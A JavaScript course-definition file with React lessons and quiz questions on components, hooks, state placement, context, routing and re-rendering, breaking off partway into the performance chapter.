import { course, chapter, lesson, q } from '../authoring.js';

export default course({
  slug: 'frontend-engineering',
  title: 'Frontend Engineering',
  category: 'Web',
  level: 'Beginner → Intermediate',
  duration: '8 weeks',
  accent: 'sky',
  coverKey: 'frontend-engineering',
  summary:
    'Stop fighting React and start engineering with it — architecture, hooks, state, routing, performance, accessibility, and tests that survive a refactor.',
  description:
    'You build the parts of a real React application that teams argue about: component boundaries, hook rules, where state belongs, routes, and render cost. Each chapter ends with you able to diagnose a specific class of production bug — stale closures, context re-render storms, memo that does nothing, forms that lock out keyboard users, and tests that break the moment you rename a div.',
  chapters: [
    chapter(
      'Component Architecture',
      'What a component actually is, how to compose instead of configure, and where state belongs.',
      [
        lesson('Components, Props, and the Rendering Contract', 12, `
A React component is a function that takes props and returns a description of UI. React calls it, compares the result with the previous one, and changes the minimum amount of DOM. Everything else in this course rests on getting that contract right.

### Rendering is not the DOM

\`\`\`jsx
function Price({ amount, currency = 'USD' }) {
  const formatted = new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency,
  }).format(amount);
  return <span className="price">{formatted}</span>;
}
\`\`\`

Calling \`<Price amount={49} />\` does not touch the DOM. It produces a plain object roughly like \`{ type: 'span', props: { className: 'price', children: '$49.00' } }\`. React collects those objects, diffs them against the previous tree — **reconciliation** — and commits only the differences.

Two consequences follow immediately:

- **A re-render is not automatically expensive.** A component running again does not mean the browser repaints. Most "too many renders" panic is panic about nothing; Chapter 4 shows how to measure instead of guess.
- **Render must be pure.** Same props and state in, same JSX out, no side effects. No \`fetch\`, no \`document.title = ...\`, no writing to a module-level counter. React deliberately invokes your component twice in development **Strict Mode** to make impure code fail loudly.

### Props are read-only

\`\`\`jsx
function TagList({ tags }) {
  tags.sort();                  // BUG: mutates the parent's array in place
  return <>{tags.join(', ')}</>;
}

function TagList({ tags }) {
  const sorted = [...tags].sort();   // copy first, then sort
  return <>{sorted.join(', ')}</>;
}
\`\`\`

The first version reorders data the parent still owns, and because the array reference never changed, React sees no reason to re-render anyone. The bug shows up three components away and looks like React "losing" data.

### Conditional rendering has one sharp edge

\`\`\`jsx
{cart.length && <CartSummary items={cart} />}     {/* renders a literal 0 */}
{cart.length > 0 && <CartSummary items={cart} />} {/* correct */}
\`\`\`

\`&&\` returns the left operand when it is falsy, and React renders the number \`0\` as text but skips \`false\`, \`null\`, and \`undefined\`. A stray zero above an empty cart is one of the most common React bugs in real codebases, and it survives code review because the expression looks obviously fine.

### Keys identify, they do not order

\`\`\`jsx
{items.map((item, i) => <Row key={i} item={item} />)}   {/* fragile */}
{items.map(item => <Row key={item.id} item={item} />)}  {/* correct */}
\`\`\`

A key tells React "this element is the same element as last time". With index keys, inserting at the front renumbers everything, so React reuses the wrong DOM nodes — half-typed inputs jump rows, checkboxes tick the wrong item, and CSS transitions animate the wrong element. Index keys are safe only for a list that is static, never reordered, and never filtered.

### Name the boundary, not the markup

A good component has one reason to change and a prop list you can read aloud. If you cannot name it without "And" — \`UserProfileAndSettingsPanel\` — it is two components. If it takes eleven props and seven are booleans, it is a configuration object pretending to be a component, which is the problem the next lesson solves.
        `),
        lesson('Composition Over Configuration', 13, `
Every long-lived React codebase eventually grows a component like this:

\`\`\`jsx
<Card
  title="Billing"
  subtitle="Manage your plan"
  showHeader
  showDivider
  showFooter
  footerAlign="right"
  primaryLabel="Save"
  onPrimary={save}
  secondaryLabel="Cancel"
  onSecondary={cancel}
  danger={false}
  compact
/>
\`\`\`

Each prop was reasonable when it was added. Together they form a private DSL that only the original author understands, and the next requirement — a footer with a checkbox in it — has no prop to add.

### Slots beat flags

\`\`\`jsx
function Card({ children }) {
  return <section className="card">{children}</section>;
}
Card.Header = ({ children }) => <header className="card-hd">{children}</header>;
Card.Body   = ({ children }) => <div className="card-bd">{children}</div>;
Card.Footer = ({ children }) => <footer className="card-ft">{children}</footer>;

// Usage — the caller composes, the card only supplies structure and style
<Card>
  <Card.Header><h2>Billing</h2></Card.Header>
  <Card.Body><PlanSummary plan={plan} /></Card.Body>
  <Card.Footer>
    <button onClick={cancel}>Cancel</button>
    <button onClick={save}>Save</button>
  </Card.Footer>
</Card>
\`\`\`

Twelve props became zero. The footer with a checkbox needs no change to \`Card\` at all. This is **composition**: the parent passes rendered UI down instead of instructions for producing it.

Multiple slots are just props that happen to hold JSX:

\`\`\`jsx
function SplitLayout({ sidebar, main }) {
  return (
    <div className="split">
      <aside>{sidebar}</aside>
      <main>{main}</main>
    </div>
  );
}

<SplitLayout sidebar={<Filters />} main={<Results />} />
\`\`\`

### Share behaviour with hooks, share markup with components

Before hooks, teams shared logic with render props and higher-order components. Today the rule is simpler: **behaviour goes in a custom hook, structure goes in a component.**

\`\`\`jsx
// Behaviour, reusable anywhere, no markup opinion at all
function useDisclosure(initial = false) {
  const [isOpen, setIsOpen] = useState(initial);
  return {
    isOpen,
    open: useCallback(() => setIsOpen(true), []),
    close: useCallback(() => setIsOpen(false), []),
    toggle: useCallback(() => setIsOpen(v => !v), []),
  };
}
\`\`\`

A \`Dropdown\`, a \`Modal\`, and an accordion row can all consume \`useDisclosure\` while looking nothing alike.

### The classic bug: components defined inside components

\`\`\`jsx
function Page() {
  const [query, setQuery] = useState('');

  // BUG: a brand-new function identity on every render of Page
  function SearchBox() {
    return <input value={query} onChange={e => setQuery(e.target.value)} />;
  }

  return <SearchBox />;
}
\`\`\`

Because \`SearchBox\` is a different function on every render, React treats it as a different component type, unmounts the old tree and mounts a fresh one. The input loses focus after every keystroke, any internal state resets, and every child remounts. Users report it as "the search box only takes one letter at a time".

The fix is to hoist the component to module scope and pass what it needs as props. The rule: **component definitions are static, component instances are dynamic.** If a function returns JSX and starts with a capital letter, it belongs at the top level of a module.

### A practical boundary test

Split a component when a piece of it has its own state that nothing else needs, when a piece is reused in a second place *unchanged*, or when the file has grown past roughly 200 lines and the JSX no longer fits on a screen. Do not split because a file "feels long" — a 300-line component with one job is easier to maintain than six 50-line components that must be read together.
        `),
        lesson('Where State Lives', 13, `
Most React bugs that look mysterious are state in the wrong place. There are only four places it can go, and picking correctly removes whole categories of problem.

| Where | Use for | Example |
|---|---|---|
| Local \`useState\` | Owned by one component | Is this menu open |
| Lifted to a parent | Two siblings must agree | Selected row + detail pane |
| URL (\`useSearchParams\`) | Shareable, bookmarkable, survives refresh | Filters, page number, tab |
| Server cache | Data that lives in a database | Course list, user profile |

### Colocate first, lift only when forced

Start with state in the component that uses it. Lift it to the **closest common ancestor** only when a second component genuinely needs the same value. Lifting too eagerly is how a \`isTooltipVisible\` boolean ends up in a top-level store, re-rendering the entire application on hover.

### Derive, do not synchronise

This is the highest-value rule in the chapter.

\`\`\`jsx
// WRONG — two sources of truth that must be kept in step forever
const [items, setItems] = useState([]);
const [total, setTotal] = useState(0);

useEffect(() => {
  setTotal(items.reduce((s, i) => s + i.price, 0));
}, [items]);

// RIGHT — one source of truth, the rest is arithmetic
const [items, setItems] = useState([]);
const total = items.reduce((s, i) => s + i.price, 0);
\`\`\`

The wrong version renders once with a stale total before the effect corrects it, and every new way of changing \`items\` is a new chance to forget the second setter. If a value can be computed from existing state during render, it is **not state** — it is a variable. Reach for \`useMemo\` only if that computation is genuinely expensive, which Chapter 4 defines precisely.

### The classic bug: props copied into state

\`\`\`jsx
function EditName({ user }) {
  const [name, setName] = useState(user.name);  // runs ONCE, on mount
  return <input value={name} onChange={e => setName(e.target.value)} />;
}
\`\`\`

\`useState(user.name)\` uses its argument as the **initial** value only. Select a different user and the input still shows the previous name, because the component did not unmount — it just re-rendered with new props. Teams "fix" this with a \`useEffect\` that calls \`setName(user.name)\` whenever \`user\` changes, which reintroduces the stale first render and silently discards the user's unsaved typing.

The idiomatic fix is to let React remount the component by changing its key:

\`\`\`jsx
<EditName key={user.id} user={user} />
\`\`\`

A new key means a new component instance, so state initialises again from the new props. **Changing a key is the supported way to reset state**, and it is far more reliable than reset effects.

### Push state into the URL when it describes the view

\`\`\`jsx
import { useSearchParams } from 'react-router-dom';

function ProductFilters() {
  const [params, setParams] = useSearchParams();
  const level = params.get('level') ?? 'all';

  return (
    <select
      value={level}
      onChange={e => setParams(prev => {
        const next = new URLSearchParams(prev);
        next.set('level', e.target.value);
        return next;
      })}
    >
      <option value="all">All levels</option>
      <option value="beginner">Beginner</option>
    </select>
  );
}
\`\`\`

Now the filtered view is shareable, survives a refresh, and works with the back button — three features you got for free by choosing the right home for one string. Chapter 3 builds this out with the rest of React Router.
        `),
      ],
      [
        q('Why does {items.length && <List />} sometimes render a bare 0?', [
          'React coerces empty arrays to 0',
          'length is a string in JSX',
          '&& returns the falsy left operand, and React renders the number 0 as text',
          'JSX requires an explicit return',
        ], 2, 'React skips false, null and undefined but renders 0 as a text node, so the falsy length leaks onto the page.'),
        q('An input inside a component defined inside another component loses focus after each keystroke. Why?', [
          'The input is uncontrolled',
          'The inner component is a new function identity each render, so React remounts its subtree',
          'onChange fires twice in Strict Mode',
          'The key prop is missing',
        ], 1, 'A new function type each render makes React unmount the old tree and mount a fresh one, destroying focus and state.'),
        q('A total can be computed from an items array. Where should it live?', [
          'In its own useState, synced by a useEffect',
          'In context so children can read it',
          'In a ref updated on change',
          'Computed during render from items',
        ], 3, 'Anything derivable from existing state is a variable, not state — a second source of truth can only drift.'),
        q('An edit form initialised with useState(user.name) shows the old name after switching users. Best fix?', [
          'Give the component key={user.id} so it remounts with fresh initial state',
          'Add a useEffect that calls setName when user changes',
          'Move name into a ref',
          'Wrap the component in React.memo',
        ], 0, 'Changing the key creates a new instance, which is the supported way to reset state without a stale first render.'),
      ]
    ),
    chapter(
      'Hooks in Depth',
      'State, effects, refs, and the custom hooks you extract once the patterns repeat.',
      [
        lesson('useState, Batching, and useReducer', 13, `
\`useState\` looks like a variable. It is closer to a mailbox: you read the value React handed you for *this* render, and you post a request for the next one.

### The value in scope is a snapshot

\`\`\`jsx
function Counter() {
  const [count, setCount] = useState(0);

  function handleTripleClick() {
    setCount(count + 1);
    setCount(count + 1);
    setCount(count + 1);
    console.log(count);   // still the old value — this render's snapshot
  }
  // count goes up by 1, not 3
}
\`\`\`

Every render gets its own \`count\` constant. All three calls read the same snapshot, compute the same number, and the last one wins. React then **batches** them into a single re-render.

The fix is the updater form, which receives the pending value rather than the captured one:

\`\`\`jsx
setCount(c => c + 1);
setCount(c => c + 1);
setCount(c => c + 1);   // now +3
\`\`\`

**Rule: if the next state depends on the previous state, pass a function.** This also makes the setter safe to call from a \`setTimeout\`, an event listener, or any other closure that may be older than the current render.

### Lazy initialisation

\`\`\`jsx
const [tree, setTree] = useState(buildTree(rawNodes));   // runs EVERY render
const [tree, setTree] = useState(() => buildTree(rawNodes));  // runs once
\`\`\`

The first form still discards the result after mount, but it pays the cost forever. Pass a function whenever the initial value is more than a literal — parsing \`localStorage\`, building a Map, generating an id.

### Objects in state are replaced, not edited

\`\`\`jsx
setProfile(p => ({ ...p, address: { ...p.address, city } }));
\`\`\`

React compares by reference, so mutating \`profile.address.city\` and calling \`setProfile(profile)\` renders nothing at all. Deeply nested spreads are a smell: either flatten the shape or reach for a reducer.

### useReducer: when transitions have rules

Split \`useState\` calls describe *values*. A reducer describes *transitions*, which is what you want the moment two pieces of state must change together.

\`\`\`jsx
const initial = { status: 'idle', data: null, error: null, page: 1 };

function reducer(state, action) {
  switch (action.type) {
    case 'fetch':   return { ...state, status: 'loading', error: null };
    case 'success': return { ...state, status: 'ready', data: action.data };
    case 'failure': return { ...state, status: 'error', error: action.error };
    case 'nextPage':
      // A guard the UI can never accidentally skip
      return state.status === 'loading' ? state : { ...state, page: state.page + 1 };
    default: throw new Error(\`Unknown action: \${action.type}\`);
  }
}

const [state, dispatch] = useReducer(reducer, initial);
dispatch({ type: 'fetch' });
\`\`\`

Three benefits are immediate. Impossible states become unrepresentable — you can no longer have \`status: 'error'\` with \`error: null\` unless the reducer allows it. The transition logic is a plain function, so it is testable without rendering anything. And \`dispatch\` has a **stable identity for the life of the component**, which means passing it to memoised children never breaks memoisation the way a fresh callback would.

### Choosing between them

| Signal | Reach for |
|---|---|
| One independent value | \`useState\` |
| Next value depends on previous | \`useState\` + updater function |
| Several fields change together | \`useReducer\` |
| Transitions have guards or invariants | \`useReducer\` |
| Logic needs unit tests without a DOM | \`useReducer\` |

The migration is cheap in both directions, so start with \`useState\` and convert when the third related \`useState\` appears in the same component.
        `),
        lesson('useEffect: Dependencies, Cleanup, and Races', 14, `
\`useEffect\` is not "run this after render". It is **synchronise this component with something outside React** — a network, a subscription, a browser API, a third-party widget. Every time you reach for it, ask what external system you are syncing with. If the answer is "none", you probably do not need an effect.

### You often do not need an effect

\`\`\`jsx
// UNNECESSARY: derived data
useEffect(() => { setFullName(first + ' ' + last); }, [first, last]);
const fullName = first + ' ' + last;                      // just compute it

// UNNECESSARY: reacting to a user event
useEffect(() => { if (submitted) postForm(values); }, [submitted]);
function handleSubmit() { postForm(values); }             // do it in the handler
\`\`\`

Effect-driven event logic runs one render late, fires again after a refresh if the flag persists, and turns a straight line into a state machine. Put event logic in the event handler.

### The dependency array is a correctness tool

\`\`\`jsx
useEffect(() => { ... });               // after every render — almost always wrong
useEffect(() => { ... }, []);           // once, on mount
useEffect(() => { ... }, [courseId]);   // whenever courseId changes
\`\`\`

Every reactive value the effect reads — props, state, and anything derived from them — belongs in the array. Removing a dependency to "stop it looping" does not fix the loop, it freezes the effect around stale values. Enable \`react-hooks/exhaustive-deps\` and treat its warnings as errors. When a dependency genuinely should not re-trigger the effect, the honest fixes are: move the function inside the effect, wrap it in \`useCallback\` at the definition site, or keep the changing value in a ref.

### Cleanup, and the race condition everyone ships once

\`\`\`jsx
useEffect(() => {
  const controller = new AbortController();

  (async () => {
    try {
      const res = await fetch(\`/api/courses/\${slug}\`, { signal: controller.signal });
      if (!res.ok) throw new Error(res.status);
      setCourse(await res.json());
    } catch (err) {
      if (err.name !== 'AbortError') setError(err);
    }
  })();

  return () => controller.abort();   // cancels the previous request
}, [slug]);
\`\`\`

Without that cleanup, switching from course A to course B fires two requests. If A's slower response lands second, it overwrites B — the user sees the wrong page and no error anywhere. **This is the single most common data-fetching bug in React applications**, and it is invisible on a fast local network, which is why it reaches production.

The cleanup function runs before the next effect and once on unmount. The same discipline applies to everything you set up:

\`\`\`jsx
useEffect(() => {
  const onResize = () => setWidth(window.innerWidth);
  window.addEventListener('resize', onResize);
  return () => window.removeEventListener('resize', onResize);
}, []);
\`\`\`

An event listener without a matching removal is a memory leak plus a setState on an unmounted component.

### Strict Mode runs your effect twice on purpose

In development, React 18+ mounts, unmounts, and remounts each component once. An effect with correct cleanup is unaffected. An effect without it double-subscribes, double-fetches, or double-increments — which is the point. If Strict Mode breaks your effect, production will break it too, just less predictably.

### Dependencies you cannot see

\`\`\`jsx
// options is a new object every render, so the effect runs forever
function Chart({ options }) {
  useEffect(() => { draw(options); }, [options]);
}
\`\`\`

React compares dependencies with \`Object.is\`. Objects, arrays, and functions created during render are new every time. Either memoise them at the source, or depend on the primitive fields you actually use — \`[options.width, options.height]\`.
        `),
        lesson('Refs, Layout Effects, and Custom Hooks', 14, `
Not every value that changes should trigger a render. \`useRef\` gives you a mutable box that survives renders and never causes one.

### Two jobs, one hook

\`\`\`jsx
// 1. A handle on a DOM node
const inputRef = useRef(null);
useEffect(() => { inputRef.current?.focus(); }, []);
return <input ref={inputRef} />;

// 2. An instance variable React should ignore
const timerRef = useRef(null);
function start() {
  timerRef.current = setInterval(tick, 1000);
}
useEffect(() => () => clearInterval(timerRef.current), []);
\`\`\`

Storing that interval id in \`useState\` would re-render the component for a value nothing displays. The test is simple: **if changing it should update the screen, it is state; otherwise it is a ref.**

Refs are also the escape hatch for values an effect needs but should not react to:

\`\`\`jsx
function useInterval(callback, delay) {
  const saved = useRef(callback);
  useEffect(() => { saved.current = callback; });   // always the latest

  useEffect(() => {
    const id = setInterval(() => saved.current(), delay);
    return () => clearInterval(id);
  }, [delay]);   // restarts only when the delay changes, not every render
}
\`\`\`

Reading \`ref.current\` during render is off-limits — it makes rendering impure and breaks concurrent features. Read and write refs in effects and event handlers.

### useLayoutEffect: when a flash is unacceptable

\`useEffect\` runs *after* the browser paints. \`useLayoutEffect\` runs after the DOM mutation but *before* paint, blocking it.

\`\`\`jsx
useLayoutEffect(() => {
  const { height } = contentRef.current.getBoundingClientRect();
  setTooltipTop(anchorTop - height - 8);   // measure, then position
}, [isOpen]);
\`\`\`

With \`useEffect\` here, the tooltip paints at the wrong position for one frame and visibly jumps. Use \`useLayoutEffect\` only for measure-then-mutate work; it is synchronous, so anything slow in it delays the frame.

### Custom hooks are functions that call hooks

A custom hook shares **logic**, never state. Two components calling \`useDebouncedValue\` each get their own independent timer and value.

\`\`\`jsx
function useDebouncedValue(value, delay = 300) {
  const [debounced, setDebounced] = useState(value);

  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), delay);
    return () => clearTimeout(id);   // each keystroke cancels the previous timer
  }, [value, delay]);

  return debounced;
}

// In a search box: one request after typing stops, not one per keystroke
const query = useDebouncedValue(input, 400);
useEffect(() => { if (query) search(query); }, [query]);
\`\`\`

For a user typing a ten-character query, that is 1 request instead of 10.

### The rules of hooks, and why they exist

1. Call hooks only at the top level — never inside a condition, loop, or nested function.
2. Call them only from components or other hooks.

React does not know your hooks by name. It tracks them by **call order**, as a list per component. An early \`return\` before a \`useState\` shifts every later hook by one slot, so your \`isOpen\` boolean reads the value that belonged to \`errorMessage\`. The symptom is bizarre — unrelated state appearing in the wrong variable — which is why the ESLint plugin is not optional.

\`\`\`jsx
if (!user) return null;               // BUG: hooks below are skipped
const [tab, setTab] = useState('a');

const [tab, setTab] = useState('a');  // all hooks first
if (!user) return null;               // then the early return
\`\`\`

### Extract a hook when the pattern is the third copy

Two similar effects are a coincidence. Three are a hook. Good candidates from real apps: \`useLocalStorage\`, \`useMediaQuery\`, \`useOnClickOutside\`, \`useDisclosure\` from Chapter 1, and \`useDebouncedValue\` above. Name them for what they give you, not for the hook they wrap.
        `),
      ],
      [
        q('Calling setCount(count + 1) three times in one handler increments by 1. Why?', [
          'React throttles rapid updates',
          'All three read the same render snapshot of count, so the last write wins',
          'Only the first setter call is registered',
          'count is a const and cannot change',
        ], 1, 'Each render captures its own count; the updater form setCount(c => c + 1) receives the pending value instead.'),
        q('Switching quickly between two detail pages shows the wrong data. Most likely cause?', [
          'The dependency array is missing a value',
          'The component is not memoised',
          'React batches the two fetches',
          'No cleanup, so a slower earlier response resolves last and overwrites the newer one',
        ], 3, 'Without aborting or flagging the previous request, response order is not guaranteed and stale data wins.'),
        q('You store a setInterval id so you can clear it later. Where does it belong?', [
          'useRef, because nothing on screen depends on it',
          'useState, so the component re-renders',
          'A module-level variable',
          'Context, so children can clear it',
        ], 0, 'Refs hold mutable values across renders without triggering one — ideal for values the UI never displays.'),
        q('Why must hooks never be called conditionally?', [
          'Conditions make them slower',
          'JSX cannot contain conditions',
          'React identifies hooks by call order, so a skipped call shifts every later hook',
          'It breaks server rendering only',
        ], 2, 'Hook state is stored as an ordered list per component; changing the order maps values onto the wrong hooks.'),
      ]
    ),
    chapter(
      'State Management and Routing',
      'Choosing where state lives at application scale, and wiring the URL to your component tree.',
      [
        lesson('Client State vs Server State', 13, `
"Which state library should we use?" is the wrong first question. The right one is: **is this state yours, or is it a copy of something on a server?**

| | Client state | Server state |
|---|---|---|
| Owner | This browser tab | The database |
| Truth | Always correct | A cache that can go stale |
| Examples | Open modal, active tab, draft text | Course list, profile, order history |
| Needs | Nothing special | Caching, deduping, revalidation, retries |

Almost every "we need Redux" conversation is really about server state, and server state is a caching problem, not a state-container problem.

### What hand-rolled fetching quietly lacks

\`\`\`jsx
function CourseList() {
  const [courses, setCourses] = useState([]);
  const [status, setStatus] = useState('loading');

  useEffect(() => {
    let cancelled = false;
    fetch('/api/courses')
      .then(r => r.json())
      .then(d => { if (!cancelled) { setCourses(d.data); setStatus('ready'); } })
      .catch(() => { if (!cancelled) setStatus('error'); });
    return () => { cancelled = true; };
  }, []);
  // ...
}
\`\`\`

This is correct, and still missing: a cache (navigate away and back, you refetch and flash a spinner), deduplication (three components mounting together fire three identical requests), background revalidation, retry on failure, and any way to tell every screen that the list changed after a mutation.

### A query cache does all of that

\`\`\`jsx
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

function useCourses() {
  return useQuery({
    queryKey: ['courses'],
    queryFn: async () => {
      const res = await fetch('/api/courses');
      if (!res.ok) throw new Error('Failed to load courses');
      const body = await res.json();
      return body.data;   // same { data: [...] } envelope as the version above
    },
    staleTime: 60_000,   // trust the cache for a minute before revalidating
  });
}

function CourseList() {
  const { data, isPending, isError, error } = useCourses();
  if (isPending) return <Spinner />;
  if (isError) return <ErrorNote message={error.message} />;
  return <ul>{data.map(c => <li key={c.id}>{c.title}</li>)}</ul>;
}
\`\`\`

The **query key** is the cache identity. Anything the request depends on goes in it — \`['course', slug]\`, \`['courses', { level, page }]\` — so changing a filter is just a different key, and the old data stays cached for the back button.

Mutations tell the cache what became untrue:

\`\`\`jsx
const qc = useQueryClient();
const enrol = useMutation({
  mutationFn: async (id) => {
    const res = await fetch(\`/api/courses/\${id}/enrol\`, { method: 'POST' });
    // fetch does not reject on 4xx/5xx — without this, onSuccess fires on failure
    if (!res.ok) throw new Error('Enrolment failed');
  },
  onSuccess: () => qc.invalidateQueries({ queryKey: ['courses'] }),
});
\`\`\`

\`invalidateQueries\` marks the entry stale and refetches wherever it is on screen. Manually calling \`setCourses\` in five components is the alternative, and it is how UIs get out of sync.

### What is left for a client store

Once server data moves to a query cache, the genuinely global client state in a typical app is small: theme, auth session, a shopping cart, maybe a wizard in progress. That fits in Context (next lesson) or a small store like Zustand:

\`\`\`jsx
import { create } from 'zustand';

export const useCart = create((set) => ({
  items: [],
  add: (item) => set(s => ({ items: [...s.items, item] })),
  clear: () => set({ items: [] }),
}));

const count = useCart(s => s.items.length);   // subscribes to the count only
\`\`\`

The selector matters: this component re-renders when the count changes, not when an unrelated field does.

### The decision, in order

1. Can it be computed during render? Then it is not state (Chapter 1).
2. Does it come from a server? Query cache.
3. Does it describe the current view and deserve to be shareable? URL.
4. Is it used by one subtree? \`useState\` there.
5. Only what survives all four is a candidate for a global store.

Following that order, most applications never need a general-purpose state library at all.
        `),
        lesson('Context Without the Re-render Tax', 13, `
Context solves exactly one problem: passing a value to a deep descendant without threading it through every component in between. It is a **transport mechanism, not a state manager**, and treating it as the latter is how applications end up re-rendering everything on every keystroke.

### The shape that works

\`\`\`jsx
const ThemeContext = createContext(null);

export function ThemeProvider({ children }) {
  const [theme, setTheme] = useState('light');

  const value = useMemo(
    () => ({ theme, toggle: () => setTheme(t => (t === 'light' ? 'dark' : 'light')) }),
    [theme]
  );

  return <ThemeContext.Provider value={value}>{children}</ThemeContext.Provider>;
}

export function useTheme() {
  const ctx = useContext(ThemeContext);
  if (!ctx) throw new Error('useTheme must be used inside a ThemeProvider');
  return ctx;
}
\`\`\`

Two details earn their place. The custom hook turns a forgotten provider into a clear error instead of \`Cannot read properties of null\`. And \`useMemo\` around the value is not an optimisation here — it is a correctness fix for the bug below.

### The classic bug: a fresh object every render

\`\`\`jsx
<AuthContext.Provider value={{ user, login, logout }}>
\`\`\`

That object literal is a **new reference on every render of the provider**. Context consumers are notified when the value fails an \`Object.is\` comparison, so every consumer in the tree re-renders whenever the provider re-renders — even consumers that only read \`logout\`, which never changed. \`React.memo\` on the children does not help: context propagates straight through memo boundaries.

Symptom in the wild: an app-wide provider holds a search string, and typing in the header re-renders a 400-row table on every character.

### Split by change frequency

A value that changes often and a value that never changes should not share a context.

\`\`\`jsx
const CartStateContext = createContext(null);
const CartDispatchContext = createContext(null);

export function CartProvider({ children }) {
  const [state, dispatch] = useReducer(cartReducer, initialCart);
  return (
    <CartDispatchContext.Provider value={dispatch}>
      <CartStateContext.Provider value={state}>
        {children}
      </CartStateContext.Provider>
    </CartDispatchContext.Provider>
  );
}
\`\`\`

\`dispatch\` from \`useReducer\` is identity-stable forever, so a component that only dispatches — an "Add to cart" button — never re-renders when the cart changes. No memoisation required.

### Keep the provider from re-rendering at all

\`\`\`jsx
// BAD: the tree is created inside the provider's own render, so every
// theme change re-renders ExpensiveTree along with the provider.
function Provider() {
  const [theme, setTheme] = useState('light');
  return (
    <ThemeContext.Provider value={theme}>
      <ExpensiveTree />
    </ThemeContext.Provider>
  );
}

// GOOD: the tree arrives as a prop, created by the parent.
function Provider({ children }) {
  const [theme, setTheme] = useState('light');
  return <ThemeContext.Provider value={theme}>{children}</ThemeContext.Provider>;
}

<Provider><ExpensiveTree /></Provider>
\`\`\`

In the second version the \`<ExpensiveTree />\` element object is built by the *parent*, which did not re-render, so React receives the identical element it saw last time and bails out of re-rendering that subtree. Provider state changes then re-render only the consumers, not the children. This is the "pass children as props" trick, and it is worth understanding before reaching for memo.

### Prop drilling is not automatically a problem

Two or three levels of explicit props are readable and greppable. Context trades that for indirection: a component's data source is no longer visible at the call site, and it can no longer be rendered in isolation without a provider — which makes tests (Chapter 5) heavier. Use context for things that are genuinely ambient: theme, current user, locale, a design-system config. Use props for everything else.
        `),
        lesson('Routing with React Router', 14, `
A single-page app has to answer two questions: what does this URL render, and how do I move between URLs without a full page load? React Router answers both, and the URL becomes the state container Chapter 1 recommended.

### Nested routes describe nested layouts

\`\`\`jsx
import { createBrowserRouter, RouterProvider, Outlet, NavLink } from 'react-router-dom';

function AppLayout() {
  return (
    <>
      <nav>
        <NavLink to="/courses" className={({ isActive }) => isActive ? 'on' : ''}>
          Courses
        </NavLink>
      </nav>
      <main><Outlet /></main>   {/* the matched child route renders here */}
    </>
  );
}

const router = createBrowserRouter([
  {
    path: '/',
    element: <AppLayout />,
    errorElement: <ErrorPage />,
    children: [
      { index: true, element: <Home /> },
      { path: 'courses', element: <CourseList /> },
      { path: 'courses/:slug', element: <CourseDetail /> },
      { path: '*', element: <NotFound /> },
    ],
  },
]);

<RouterProvider router={router} />;
\`\`\`

\`<Outlet />\` is the slot pattern from Chapter 1 applied to routing: the layout stays mounted while children swap, so the nav does not remount and scroll position in a sidebar is preserved.

### Reading and changing the URL

\`\`\`jsx
const { slug } = useParams();                    // /courses/react-basics
const [params, setParams] = useSearchParams();   // ?page=2&level=beginner
const navigate = useNavigate();
const location = useLocation();

navigate('/courses');                             // push
navigate('/login', { replace: true, state: { from: location } });
\`\`\`

Route params are strings, always. \`Number(params.get('page') ?? 1)\` — forgetting that conversion produces \`"2" + 1 === "21"\`, a bug that only appears on page two.

### Link, not anchor

\`\`\`jsx
<a href="/courses">Courses</a>       {/* full page reload: state lost, slow */}
<Link to="/courses">Courses</Link>   {/* client-side navigation */}
\`\`\`

\`<Link>\` still renders a real \`<a>\` with an \`href\`, so middle-click, right-click "open in new tab", and screen readers all work. Never simulate navigation with a \`div\` and \`onClick\` — that is the accessibility failure from Chapter 5, and it costs you every browser affordance.

### Protecting routes

\`\`\`jsx
function RequireAuth({ children }) {
  const { user, isLoading } = useAuth();
  const location = useLocation();

  if (isLoading) return <Spinner />;               // do not redirect while unknown
  if (!user) return <Navigate to="/login" replace state={{ from: location }} />;
  return children;
}

{ path: 'dashboard', element: <RequireAuth><Dashboard /></RequireAuth> }
\`\`\`

The \`isLoading\` branch is the part people skip: without it, a refresh on a protected page bounces the user to \`/login\` for a moment before the session resolves. And \`replace\` keeps the login page out of the history stack, so back does not return to it. Client-side guards are UX only — the server must still authorise every request.

### Split the bundle at the route boundary

\`\`\`jsx
import { lazy, Suspense } from 'react';
const Analytics = lazy(() => import('./routes/Analytics'));

{ path: 'analytics',
  element: <Suspense fallback={<Skeleton />}><Analytics /></Suspense> }
\`\`\`

Routes are the natural split point: a visitor to the home page should not download the charting library used on one admin screen. Chapter 4 covers the measurement side.

### The deployment trap

Hard-refreshing \`/courses/react-basics\` sends a real request to your server for a path that has no file. Static hosts return 404 until you configure a rewrite so every unmatched path serves \`index.html\` — a \`try_files\` rule in nginx, a \`_redirects\` line on Netlify, or the Express catch-all registered *after* the API routes. Everything works in development, then breaks on the first shared link. Check it before launch, not after.
        `),
      ],
      [
        q('Which of these is server state rather than client state?', [
          'The list of courses fetched from an API',
          'Whether a dropdown is open',
          'The current step of a multi-step form',
          'The selected theme',
        ], 0, 'Data owned by a database is a cache in the browser, so it needs staleness, revalidation and invalidation handling.'),
        q('Typing in a header input re-renders a large unrelated table. The provider passes value={{ query, setQuery }}. Why?', [
          'React.memo was not applied to the table',
          'Context values must be primitives',
          'The inline object is a new reference each render, so every context consumer re-renders',
          'The table is missing keys',
        ], 2, 'Consumers compare the context value by identity, and a fresh object literal fails that comparison every render.'),
        q('Why is dispatch from useReducer safe to expose through its own context?', [
          'It is memoised automatically by React.memo',
          'Its identity is stable for the component lifetime, so dispatch-only consumers never re-render',
          'It never changes state',
          'Context ignores function values',
        ], 1, 'A stable reference means the dispatch context value never changes identity, so subscribers to it are not notified.'),
        q('A deployed SPA 404s when a user refreshes /courses/react. What is missing?', [
          'A catch-all route in React Router',
          'HTTPS',
          'A Suspense boundary',
          'A server rewrite serving index.html for unmatched paths',
        ], 3, 'The browser asks the server for that path directly, so the host must fall back to index.html for client-side routing to take over.'),
      ]
    ),
    chapter(
      'Performance',
      'Why React re-renders, what memoisation actually buys, and how to ship less JavaScript and fewer DOM nodes.',
      [
        lesson('Why React Re-renders', 13, `
Before optimising anything, you need an accurate model of when a component runs. There are exactly three triggers:

1. **Its own state changed** — a \`useState\` setter or \`dispatch\` was called with a different value.
2. **Its parent re-rendered** — by default, children re-render when their parent does, regardless of props.
3. **A context it consumes changed** — the provider's value failed an \`Object.is\` check.

Notice what is *not* on the list: props changing. Props changing is a consequence of the parent re-rendering, not an independent cause. And a component whose props are identical still re-renders when its parent does, unless it is wrapped in \`React.memo\`.
